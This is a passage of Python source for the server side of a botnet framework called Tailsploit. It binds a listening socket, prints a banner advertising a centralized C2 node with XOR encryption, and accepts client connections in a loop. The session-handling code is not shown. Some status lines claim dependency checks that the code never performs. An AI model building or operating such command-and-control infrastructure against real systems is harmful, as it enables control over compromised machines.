            if 0 < self.TSF_SERVER_PORT < 65536: 
                print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Done, Port binded to Tailsploit Server")
                time.sleep(0.1)
            else:
                print("PORT")
        except:
            print("Error Port")
            
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking Tailsploit Dependencies")
        time.sleep(0.1)
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] All required dependencies are satisfied.")
        time.sleep(0.1)
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Binding the Tailsploit Server socket...")
        time.sleep(0.2)
        print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server socket bound successfully.")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.TSF_SERVER_IP, self.TSF_SERVER_PORT))
        server_socket.listen()
        end_time = time.time() 
        elapsed_time_ms = (end_time - start_time) * 1000
        os.system("cls")
        print("")
        ctypes.windll.kernel32.SetConsoleTitleW("Tailsploit Botnet Server Handler")
        print("")
        print(f"""    
             ..........             
         ..................          Tailsploit Framework Server (Enjoy Pentest !)
      ..........    ..........      
    ........            ........     For more information, read the Tailsploit documentation : \x1B[4mhttps://www.tailsploit.com\x1B[0m    
    .....                 ......    
    .....               ........     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Status: {Fore.GREEN}Running{Style.RESET_ALL}
    .....            ...........    
    .....         ..............     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Encryption Type: {Fore.YELLOW}XOR Encryption (Low-Level){Style.RESET_ALL}
    .....         ..............    
    .....         ..............     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Information: {self.TSF_SERVER_IP} : {self.TSF_SERVER_PORT}
    ......        ..............    
     ........     .............      [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Botnet Type: {Fore.YELLOW}Centralized Node (C2){Style.RESET_ALL}
       ......... ............       
          ................           [{Fore.GREEN}*{Style.RESET_ALL}] Server Started In {Fore.GREEN}{elapsed_time_ms:.2f}{Style.RESET_ALL} ms
             ..........             



\x1B[4mTailsploit Server Log\x1B[0m >
""")

        data_thread = threading.Thread(target=self.TailsploitTrafficCommunicationData, name="Traffic Communication Data Handler Tailsploit Server (XOR)")
        data_thread.start()

        while True:
            client_socket, client_addr = server_socket.accept()

            #print(f"[+] Accepted connection from: {client_addr}")

            self.TailsploitBasicSessionHandler(client_socket, client_addr)

if __name__ == "__main__":
    x = ServerShell()
    x.InitializingTailsploitServer()
